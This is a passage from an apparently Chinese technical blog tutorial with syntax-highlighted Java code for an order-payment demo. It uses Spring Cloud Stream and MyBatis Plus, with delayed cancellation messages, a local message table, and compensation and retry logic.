  `max_retry_count` TINYINT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">3</span> COMMENT <span class="hljs-string">'最大重试次数'</span>,
  `create_time` DATETIME <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  `update_time` DATETIME <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  KEY `idx_business_status` (`business_id`, `status`)
);
</code></pre>
<h4 data-id="heading-7">2. 实体类</h4>
<h5 data-id="heading-8">（1）订单实体（TOrder.java）</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.orderpaydemo.entity;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.<span class="hljs-keyword">annotation</span>.IdType;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.<span class="hljs-keyword">annotation</span>.TableId;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.<span class="hljs-keyword">annotation</span>.TableName;
<span class="hljs-keyword">import</span> lombok.Data;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@TableName(<span class="hljs-string">"t_order"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TOrder</span> {
    <span class="hljs-comment">/**
     * 订单ID
     */</span>
    <span class="hljs-meta">@TableId(type = IdType.AUTO)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Long</span> id;

    <span class="hljs-comment">/**
     * 订单编号
     */</span>
    <span class="hljs-keyword">private</span> String orderNo;

    <span class="hljs-comment">/**
     * 用户ID
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">Long</span> userId;

    <span class="hljs-comment">/**
     * 订单金额
     */</span>
    <span class="hljs-keyword">private</span> BigDecimal amount;

    <span class="hljs-comment">/**
     * 状态：0-待支付 1-已支付 2-已取消 3-已退款
     */</span>
    <span class="hljs-keyword">private</span> Integer status;

    <span class="hljs-comment">/**
     * 创建时间
     */</span>
    <span class="hljs-keyword">private</span> LocalDateTime createTime;

    <span class="hljs-comment">/**
     * 更新时间
     */</span>
    <span class="hljs-keyword">private</span> LocalDateTime updateTime;

    <span class="hljs-comment">// 状态枚举</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> StatusEnum {
        UNPAID(<span class="hljs-number">0</span>, <span class="hljs-string">"待支付"</span>),
        PAID(<span class="hljs-number">1</span>, <span class="hljs-string">"已支付"</span>),
        CANCELED(<span class="hljs-number">2</span>, <span class="hljs-string">"已取消"</span>),
        REFUNDED(<span class="hljs-number">3</span>, <span class="hljs-string">"已退款"</span>);

        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> int code;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;

        StatusEnum(int code, String desc) {
            <span class="hljs-keyword">this</span>.code = code;
            <span class="hljs-keyword">this</span>.desc = desc;
        }

        <span class="hljs-keyword">public</span> int getCode() {
            <span class="hljs-keyword">return</span> code;
        }
    }
}
</code></pre>
<h5 data-id="heading-9">（2）本地消息实体（TLocalMessage.java）</h5>
<pre><code class="hljs language-arduino" lang="arduino">package com.example.orderpaydemo.entity;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.annotation.IdType;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.annotation.TableId;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.annotation.TableName;
<span class="hljs-keyword">import</span> lombok.Data;

<span class="hljs-keyword">import</span> java.time.LocalDateTime;

@Data
@<span class="hljs-built_in">TableName</span>(<span class="hljs-string">"t_local_message"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TLocalMessage</span> {
    <span class="hljs-comment">/**
     * 消息ID
     */</span>
    @<span class="hljs-built_in">TableId</span>(type = IdType.AUTO)
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-comment">/**
     * 消息类型
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> messageType;

    <span class="hljs-comment">/**
     * 业务ID（订单ID）
     */</span>
    <span class="hljs-keyword">private</span> Long businessId;

    <span class="hljs-comment">/**
     * 消息内容
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> messageContent;

    <span class="hljs-comment">/**
     * 状态：0-待处理 1-处理中 2-已完成 3-失败
     */</span>
    <span class="hljs-keyword">private</span> Integer status;

    <span class="hljs-comment">/**
     * 重试次数
     */</span>
    <span class="hljs-keyword">private</span> Integer retryCount;

    <span class="hljs-comment">/**
     * 最大重试次数
     */</span>
    <span class="hljs-keyword">private</span> Integer maxRetryCount;

    <span class="hljs-comment">/**
     * 创建时间
     */</span>
    <span class="hljs-keyword">private</span> LocalDateTime createTime;

    <span class="hljs-comment">/**
     * 更新时间
     */</span>
    <span class="hljs-keyword">private</span> LocalDateTime updateTime;

    <span class="hljs-comment">// 消息类型常量</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> TYPE_ORDER_PAY_CANCEL_DELAY = <span class="hljs-string">"ORDER_PAY_CANCEL_DELAY"</span>;
    <span class="hljs-comment">// 状态常量</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> Integer STATUS_PENDING = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> Integer STATUS_PROCESSING = <span class="hljs-number">1</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> Integer STATUS_COMPLETED = <span class="hljs-number">2</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> Integer STATUS_FAILED = <span class="hljs-number">3</span>;
}
</code></pre>
<h4 data-id="heading-10">3. Mapper层（MyBatis Plus）</h4>
<h5 data-id="heading-11">（1）订单Mapper（TOrderMapper.java）</h5>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">package</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.mapper</span>;

<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.baomidou</span><span class="hljs-selector-class">.mybatisplus</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.mapper</span><span class="hljs-selector-class">.BaseMapper</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.entity</span><span class="hljs-selector-class">.TOrder</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.Param</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.stereotype</span><span class="hljs-selector-class">.Repository</span>;

<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.List</span>;

@<span class="hljs-selector-tag">Repository</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">interface</span> <span class="hljs-selector-tag">TOrderMapper</span> <span class="hljs-selector-tag">extends</span> <span class="hljs-selector-tag">BaseMapper</span>&lt;<span class="hljs-selector-tag">TOrder</span>&gt; {
    <span class="hljs-comment">/**
     * 取消订单（乐观锁）
     */</span>
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">cancelOrder</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"id"</span>) Long id, <span class="hljs-variable">@Param</span>(<span class="hljs-string">"oldStatus"</span>) Integer oldStatus);

    <span class="hljs-comment">/**
     * 查询异常订单（已支付但被取消/待支付但超时未取消）
     */</span>
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TOrder</span>&gt; <span class="hljs-selector-tag">listAbnormalOrders</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"expireMinutes"</span>) Integer expireMinutes);
}
</code></pre>
<h5 data-id="heading-12">（2）本地消息Mapper（TLocalMessageMapper.java）</h5>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">package</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.mapper</span>;

<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.baomidou</span><span class="hljs-selector-class">.mybatisplus</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.mapper</span><span class="hljs-selector-class">.BaseMapper</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.entity</span><span class="hljs-selector-class">.TLocalMessage</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.annotations</span><span class="hljs-selector-class">.Param</span>;
<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.stereotype</span><span class="hljs-selector-class">.Repository</span>;

<span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.List</span>;

@<span class="hljs-selector-tag">Repository</span>
<span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">interface</span> <span class="hljs-selector-tag">TLocalMessageMapper</span> <span class="hljs-selector-tag">extends</span> <span class="hljs-selector-tag">BaseMapper</span>&lt;<span class="hljs-selector-tag">TLocalMessage</span>&gt; {
    <span class="hljs-comment">/**
     * 更新消息状态
     */</span>
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">updateStatus</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"id"</span>) Long id, <span class="hljs-variable">@Param</span>(<span class="hljs-string">"oldStatus"</span>) Integer oldStatus, <span class="hljs-variable">@Param</span>(<span class="hljs-string">"newStatus"</span>) Integer newStatus);

    <span class="hljs-comment">/**
     * 更新重试次数
     */</span>
    <span class="hljs-selector-tag">int</span> <span class="hljs-selector-tag">updateRetryCount</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"id"</span>) Long id, <span class="hljs-variable">@Param</span>(<span class="hljs-string">"retryCount"</span>) Integer retryCount);

    <span class="hljs-comment">/**
     * 查询待处理消息
     */</span>
    <span class="hljs-selector-tag">List</span>&lt;<span class="hljs-selector-tag">TLocalMessage</span>&gt; <span class="hljs-selector-tag">listPendingMessages</span>(<span class="hljs-variable">@Param</span>(<span class="hljs-string">"maxRetryCount"</span>) Integer maxRetryCount);
}
</code></pre>
<h4 data-id="heading-13">4. Stream消息通道（OrderMessageChannels.java）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.orderpaydemo.stream;

<span class="hljs-keyword">import</span> org.springframework.cloud.stream.annotation.Input;
<span class="hljs-keyword">import</span> org.springframework.cloud.stream.annotation.Output;
<span class="hljs-keyword">import</span> org.springframework.messaging.MessageChannel;
<span class="hljs-keyword">import</span> org.springframework.messaging.SubscribableChannel;

<span class="hljs-comment">/**
 * Stream消息通道定义
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderMessageChannels</span> {
    <span class="hljs-comment">// ====================== 延迟取消订单 ======================</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">ORDER_DELAY_OUTPUT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"order-delay-output"</span>; <span class="hljs-comment">// 生产者</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">ORDER_DELAY_INPUT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"order-delay-input"</span>;   <span class="hljs-comment">// 消费者</span>

    <span class="hljs-meta">@Output(ORDER_DELAY_OUTPUT)</span>
    MessageChannel <span class="hljs-title function_">orderDelayOutput</span><span class="hljs-params">()</span>;

    <span class="hljs-meta">@Input(ORDER_DELAY_INPUT)</span>
    SubscribableChannel <span class="hljs-title function_">orderDelayInput</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">// ====================== 反向撤销指令 ======================</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">ORDER_CANCEL_REVOKE_OUTPUT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"order-cancel-revoke-output"</span>; <span class="hljs-comment">// 生产者</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">ORDER_CANCEL_REVOKE_INPUT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"order-cancel-revoke-input"</span>;   <span class="hljs-comment">// 消费者</span>

    <span class="hljs-meta">@Output(ORDER_CANCEL_REVOKE_OUTPUT)</span>
    MessageChannel <span class="hljs-title function_">orderCancelRevokeOutput</span><span class="hljs-params">()</span>;

    <span class="hljs-meta">@Input(ORDER_CANCEL_REVOKE_INPUT)</span>
    SubscribableChannel <span class="hljs-title function_">orderCancelRevokeInput</span><span class="hljs-params">()</span>;

    <span class="hljs-comment">// ====================== 补偿任务 ======================</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">ORDER_COMPENSATE_OUTPUT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"order-compensate-output"</span>; <span class="hljs-comment">// 生产者</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">ORDER_COMPENSATE_INPUT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"order-compensate-input"</span>;   <span class="hljs-comment">// 消费者</span>

    <span class="hljs-meta">@Output(ORDER_COMPENSATE_OUTPUT)</span>
    MessageChannel <span class="hljs-title function_">orderCompensateOutput</span><span class="hljs-params">()</span>;

    <span class="hljs-meta">@Input(ORDER_COMPENSATE_INPUT)</span>
    SubscribableChannel <span class="hljs-title function_">orderCompensateInput</span><span class="hljs-params">()</span>;
}
</code></pre>
<h4 data-id="heading-14">5. 核心业务服务</h4>
<h5 data-id="heading-15">（1）订单创建服务（OrderCreateService.java）</h5>
<pre><code class="hljs language-scss" lang="scss">package com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.service</span>;

import cn<span class="hljs-selector-class">.hutool</span><span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.UUID</span>;
import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.entity</span><span class="hljs-selector-class">.TOrder</span>;
import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.mapper</span><span class="hljs-selector-class">.TOrderMapper</span>;
import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.stream</span><span class="hljs-selector-class">.OrderMessageChannels</span>;
import lombok<span class="hljs-selector-class">.RequiredArgsConstructor</span>;
import lombok<span class="hljs-selector-class">.extern</span><span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.Slf4j</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.stream</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.EnableBinding</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.MessageBuilder</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.stereotype</span><span class="hljs-selector-class">.Service</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.transaction</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Transactional</span>;

import java<span class="hljs-selector-class">.math</span><span class="hljs-selector-class">.BigDecimal</span>;
import java<span class="hljs-selector-class">.time</span><span class="hljs-selector-class">.LocalDateTime</span>;

<span class="hljs-comment">/**
 * 订单创建服务：下单+发送延迟取消消息
 */</span>
<span class="hljs-keyword">@Slf</span>4j
<span class="hljs-keyword">@Service</span>
<span class="hljs-keyword">@RequiredArgsConstructor</span>
<span class="hljs-keyword">@EnableBinding</span>(OrderMessageChannels.class)
public class OrderCreateService {
    private final TOrderMapper orderMapper;
    private final OrderMessageChannels messageChannels;

    <span class="hljs-comment">/**
     * 创建订单（核心下单逻辑）
     */</span>
    <span class="hljs-keyword">@Transactional</span>(rollbackFor = Exception.class)
    public Long createOrder(Long userId, BigDecimal amount) {
        <span class="hljs-comment">// 1. 构建订单</span>
        TOrder <span class="hljs-attribute">order</span> = new <span class="hljs-built_in">TOrder</span>();
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setOrderNo</span>(UUID.randomUUID()<span class="hljs-selector-class">.toString</span>()<span class="hljs-selector-class">.replace</span>("-", "")<span class="hljs-selector-class">.substring</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>));
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setUserId</span>(userId);
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setAmount</span>(amount);
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setStatus</span>(TOrder.StatusEnum.UNPAID.getCode());
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setCreateTime</span>(LocalDateTime.now());
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setUpdateTime</span>(LocalDateTime.now());

        <span class="hljs-comment">// 2. 订单落库</span>
        orderMapper<span class="hljs-selector-class">.insert</span>(order);
        log<span class="hljs-selector-class">.info</span>("订单创建成功 | 订单ID：{} | 订单号：{}", order.getId(), <span class="hljs-attribute">order</span><span class="hljs-selector-class">.getOrderNo</span>());

        <span class="hljs-comment">// 3. 发送延迟取消消息（5分钟后触发）</span>
        <span class="hljs-built_in">sendDelayCancelMessage</span>(order.getId());

        return <span class="hljs-attribute">order</span><span class="hljs-selector-class">.getId</span>();
    }

    <span class="hljs-comment">/**
     * 发送延迟取消消息
     */</span>
    private void <span class="hljs-built_in">sendDelayCancelMessage</span>(Long orderId) {
        boolean sendResult = messageChannels<span class="hljs-selector-class">.orderDelayOutput</span>()
                <span class="hljs-selector-class">.send</span>(MessageBuilder.withPayload(orderId)<span class="hljs-selector-class">.build</span>());

        if (sendResult) {
            log<span class="hljs-selector-class">.info</span>("延迟取消消息发送成功 | 订单ID：{}", orderId);
        } else {
            log<span class="hljs-selector-class">.error</span>("延迟取消消息发送失败 | 订单ID：{}", orderId);
            throw new <span class="hljs-built_in">RuntimeException</span>("延迟消息发送失败，订单创建回滚");
        }
    }
}
</code></pre>
<h5 data-id="heading-16">（2）支付回调服务（OrderPayService.java）</h5>
<pre><code class="hljs language-scss" lang="scss">package com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.service</span>;

import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.entity</span><span class="hljs-selector-class">.TLocalMessage</span>;
import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.entity</span><span class="hljs-selector-class">.TOrder</span>;
import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.mapper</span><span class="hljs-selector-class">.TLocalMessageMapper</span>;
import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.mapper</span><span class="hljs-selector-class">.TOrderMapper</span>;
import com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.orderpaydemo</span><span class="hljs-selector-class">.stream</span><span class="hljs-selector-class">.OrderMessageChannels</span>;
import lombok<span class="hljs-selector-class">.RequiredArgsConstructor</span>;
import lombok<span class="hljs-selector-class">.extern</span><span class="hljs-selector-class">.slf4j</span><span class="hljs-selector-class">.Slf4j</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.stream</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.EnableBinding</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.messaging</span><span class="hljs-selector-class">.support</span><span class="hljs-selector-class">.MessageBuilder</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.scheduling</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Scheduled</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.stereotype</span><span class="hljs-selector-class">.Service</span>;
import org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.transaction</span><span class="hljs-selector-class">.annotation</span><span class="hljs-selector-class">.Transactional</span>;

import java<span class="hljs-selector-class">.time</span><span class="hljs-selector-class">.LocalDateTime</span>;
import java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span>;
import java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Map</span>;
import java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.concurrent</span><span class="hljs-selector-class">.ConcurrentHashMap</span>;

<span class="hljs-comment">/**
 * 支付回调服务：更新订单+发送撤销指令+补偿任务+回调重试
 */</span>
<span class="hljs-keyword">@Slf</span>4j
<span class="hljs-keyword">@Service</span>
<span class="hljs-keyword">@RequiredArgsConstructor</span>
<span class="hljs-keyword">@EnableBinding</span>(OrderMessageChannels.class)
public class OrderPayService {
    private final TOrderMapper orderMapper;
    private final TLocalMessageMapper localMessageMapper;
    private final OrderMessageChannels messageChannels;

    <span class="hljs-comment">// 待重试的回调任务（模拟支付系统重试）</span>
    private final ConcurrentHashMap&lt;Long, Integer&gt; retryCallbackMap = new ConcurrentHashMap&lt;&gt;();

    <span class="hljs-comment">/**
     * 支付回调核心方法（本地事务+最终一致性）
     */</span>
    <span class="hljs-keyword">@Transactional</span>(rollbackFor = Exception.class)
    public void handlePayCallback(Long orderId) {
        <span class="hljs-comment">// 1. 校验订单状态</span>
        TOrder <span class="hljs-attribute">order</span> = orderMapper<span class="hljs-selector-class">.selectById</span>(orderId);
        if (order == null) {
            throw new <span class="hljs-built_in">RuntimeException</span>("订单不存在 | 订单ID：" + orderId);
        }
        if (!TOrder.StatusEnum.UNPAID.getCode()<span class="hljs-selector-class">.equals</span>(order.getStatus())) {
            log<span class="hljs-selector-class">.warn</span>("订单非待支付状态，无需处理 | 订单ID：{} | 状态：{}", orderId, order.getStatus());
            return;
        }

        <span class="hljs-comment">// 2. 更新订单状态为已支付（本地事务）</span>
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setStatus</span>(TOrder.StatusEnum.PAID.getCode());
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setUpdateTime</span>(LocalDateTime.now());
        orderMapper<span class="hljs-selector-class">.updateById</span>(order);
        log<span class="hljs-selector-class">.info</span>("订单状态更新为已支付 | 订单ID：{}", orderId);

        <span class="hljs-comment">// 3. 落本地消息表（记录补偿任务）</span>
        TLocalMessage message = new <span class="hljs-built_in">TLocalMessage</span>();
        message<span class="hljs-selector-class">.setMessageType</span>(TLocalMessage.TYPE_ORDER_PAY_CANCEL_DELAY);
        message<span class="hljs-selector-class">.setBusinessId</span>(orderId);
        message<span class="hljs-selector-class">.setMessageContent</span>(buildMessageContent(orderId));
        message<span class="hljs-selector-class">.setStatus</span>(TLocalMessage.STATUS_PENDING);
        message<span class="hljs-selector-class">.setRetryCount</span>(<span class="hljs-number">0</span>);
        message<span class="hljs-selector-class">.setMaxRetryCount</span>(<span class="hljs-number">3</span>);
        message<span class="hljs-selector-class">.setCreateTime</span>(LocalDateTime.now());
        message<span class="hljs-selector-class">.setUpdateTime</span>(LocalDateTime.now());
        localMessageMapper<span class="hljs-selector-class">.insert</span>(message);
        log<span class="hljs-selector-class">.info</span>("本地消息表落库成功 | 消息ID：{} | 订单ID：{}", message.getId(), orderId);

        <span class="hljs-comment">// 4. 发送反向撤销指令（核心：让延迟消息过滤该订单）</span>
        <span class="hljs-built_in">sendRevokeCancelMessage</span>(orderId);

        <span class="hljs-comment">// 5. 发送补偿任务消息（兜底：确保撤销指令生效）</span>
        <span class="hljs-built_in">sendCompensateMessage</span>(orderId);

        <span class="hljs-comment">// 6. 移除重试标记</span>
        retryCallbackMap<span class="hljs-selector-class">.remove</span>(orderId);
    }

    <span class="hljs-comment">/**
     * 模拟支付系统回调重试（每隔60秒重试，共3次）
     */</span>
    public void <span class="hljs-built_in">addCallbackRetryTask</span>(Long orderId) {
        retryCallbackMap<span class="hljs-selector-class">.putIfAbsent</span>(orderId, <span class="hljs-number">0</span>);
        log<span class="hljs-selector-class">.info</span>("添加支付回调重试任务 | 订单ID：{}", orderId);
    }

    <span class="hljs-comment">/**
     * 定时执行回调重试（模拟支付系统逻辑）
     */</span>
    <span class="hljs-keyword">@Scheduled</span>(fixedRateString = <span class="hljs-string">"${order.pay.callback-retry-interval}000"</span>)
    public void executeCallbackRetry() {
        retryCallbackMap<span class="hljs-selector-class">.forEach</span>((orderId, retryCount) -&gt; {
            if (retryCount &gt;= Integer.parseInt(System.getProperty("order.pay.callback-retry-times", "<span class="hljs-number">3</span>"))) {
                <span class="hljs-comment">// 重试次数耗尽，发起退款</span>
                <span class="hljs-built_in">refundOrder</span>(orderId);
                retryCallbackMap<span class="hljs-selector-class">.remove</span>(orderId);
                return;
            }

            try {
                log<span class="hljs-selector-class">.info</span>("支付回调重试 | 订单ID：{} | 重试次数：{}", orderId, retryCount + <span class="hljs-number">1</span>);
                <span class="hljs-built_in">handlePayCallback</span>(orderId);
            } catch (Exception e) {
                log<span class="hljs-selector-class">.error</span>("支付回调重试失败 | 订单ID：{}", orderId, e);
                retryCallbackMap<span class="hljs-selector-class">.put</span>(orderId, retryCount + <span class="hljs-number">1</span>);
            }
        });
    }

    <span class="hljs-comment">/**
     * 退款（反向操作：抵消扣款）
     */</span>
    private void <span class="hljs-built_in">refundOrder</span>(Long orderId) {
        TOrder <span class="hljs-attribute">order</span> = orderMapper<span class="hljs-selector-class">.selectById</span>(orderId);
        if (order == null) {
            return;
        }
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setStatus</span>(TOrder.StatusEnum.REFUNDED.getCode());
        <span class="hljs-attribute">order</span><span class="hljs-selector-class">.setUpdateTime</span>(LocalDateTime.now());
        orderMapper<span class="hljs-selector-class">.updateById</span>(order);
        log<span class="hljs-selector-class">.warn</span>("订单退款成功（回调重试失败）| 订单ID：{}", orderId);
    }

    <span class="hljs-comment">/**
     * 构建消息内容
     */</span>
    private String <span class="hljs-built_in">buildMessageContent</span>(Long orderId) {
        Map&lt;String, <span class="hljs-selector-tag">Object</span>&gt; <span class="hljs-attribute">content</span> = new HashMap&lt;&gt;();
        <span class="hljs-attribute">content</span><span class="hljs-selector-class">.put</span>("orderId", orderId);
        <span class="hljs-attribute">content</span><span class="hljs-selector-class">.put</span>("task", "revoke_cancel_order");
        return <span class="hljs-attribute">content</span><span class="hljs-selector-class">.toString</span>();
    }

    <span class="hljs-comment">/**
     * 发送反向撤销指令
     */</span>
    private void <span class="hljs-built_in">sendRevokeCancelMessage</span>(Long orderId) {
        boolean sendResult = messageChannels<span class="hljs-selector-class">.orderCancelRevokeOutput</span>()
                <span class="hljs-selector-class">.send</span>(MessageBuilder.withPayload(orderId)<span class="hljs-selector-class">.build</span>());
        if (sendResult) {
            log<span class="hljs-selector-class">.info</span>("反向撤销指令发送成功 | 订单ID：{}", orderId);
        } else {
            log<span class="hljs-selector-class">.error</span>("反向撤销指令发送失败 | 订单ID：{}", orderId);
            <span class="hljs-comment">// 发送失败不抛异常，依赖补偿任务兜底</span>
        }
    }

    <span class="hljs-comment">/**
     * 发送补偿任务消息
     */</span>
    private void <span class="hljs-built_in">sendCompensateMessage</span>(Long orderId) {
        boolean sendResult = messageChannels<span class="hljs-selector-class">.orderCompensateOutput</span>()
                <span class="hljs-selector-class">.send</span>(MessageBuilder.withPayload(orderId)<span class="hljs-selector-class">.build</span>());
        if (sendResult) {
            log<span class="hljs-selector-class">.info</span>("补偿任务消息发送成功 | 订单ID：{}", orderId);
        } else {
            log<span class="hljs-selector-class">.error</span>("补偿任务消息发送失败 | 订单ID：{}", orderId);
        }
    }
}
</code></pre>
<h5 data-id="heading-17">（3）订单取消服务（OrderCancelService.java）</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.orderpaydemo.service;

<span class="hljs-keyword">import</span> com.example.orderpaydemo.entity.TOrder;
<span class="hljs-keyword">import</span> com.example.orderpaydemo.mapper.TOrderMapper;
<span class="hljs-keyword">import</span> lombok.RequiredArgsConstructor;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.<span class="hljs-keyword">annotation</span>.Transactional;

<span class="hljs-comment">/**
 * 订单取消服务：核心取消逻辑
 */</span>
